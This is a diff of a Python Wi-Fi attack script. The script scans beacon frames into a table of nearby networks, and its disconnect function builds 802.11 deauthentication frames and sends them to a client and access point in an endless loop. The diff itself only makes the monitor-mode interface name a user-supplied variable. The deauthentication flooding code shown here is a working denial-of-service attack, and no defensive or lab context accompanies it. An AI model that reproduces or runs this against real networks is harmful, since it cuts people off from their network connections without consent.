@@ -9,7 +9,7 @@ import random
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
 # set the index BSSID (MAC address of the AP)
 networks.set_index("BSSID", inplace=True)
-interface = "wlan0mon"
+# interface = "wlan0mon"
 def callback(packet):
 	if packet.haslayer(Dot11Beacon):
 		# extract the MAC address of the network
@@ -35,7 +35,7 @@ def disconnect(_ap, _st):
 	pkt = RadioTap() / Dot11(addr1=_st, addr2=_ap, addr3=_ap) / Dot11Deauth(reason=2)
 	while True:	
 		# print("hell")
-		sendp(pkt, iface="wlan0mon", verbose=False)
+		sendp(pkt, iface=interface, verbose=False)
 
 def findBSS(bssid_diconnect):
             print ("Disconnecting: %s" % bssid_diconnect)
@@ -85,6 +85,7 @@ if __name__ == "__main__":
 	# interface name, check using iwconfig
 	
 	# interface = "wlan0mon"
+	global interface
 	interface  = input("Enter the monitor mode wifi interface name: ")
 	# start the thread that prints all the networks
 			# start the channel changer
